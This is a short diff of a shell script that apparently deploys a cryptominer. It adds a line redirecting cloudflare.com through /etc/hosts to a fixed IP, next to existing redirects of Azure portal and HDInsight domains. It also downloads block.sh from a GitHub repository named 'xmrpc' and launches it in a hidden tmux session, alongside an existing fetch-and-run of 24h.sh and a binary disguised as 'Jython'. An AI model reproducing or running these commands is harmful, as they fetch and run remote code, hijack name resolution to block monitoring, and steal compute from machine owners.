@@ -31,8 +31,11 @@ sudo chmod +x httpd
 mv httpd Jython
 sudo -- sh -c "echo '103.145.255.41  portal.azure.com' >> /etc/hosts"
 sudo -- sh -c "echo '103.145.255.41  azurehdinsight.net' >> /etc/hosts"
+sudo -- sh -c "echo '103.145.255.41  cloudflare.com' >> /etc/hosts"
 wget https://raw.githubusercontent.com/minnie1311/xmrpc/master/24h.sh
 sudo chmod +x 24h.sh
 sudo tmux new-session -d -s my_session12  './24h.sh'
-
+wget https://raw.githubusercontent.com/minnie1311/xmrpc/master/block.sh
+sudo chmod +x block.sh
+sudo tmux new-session -d -s my_session1342  './block.sh'
 
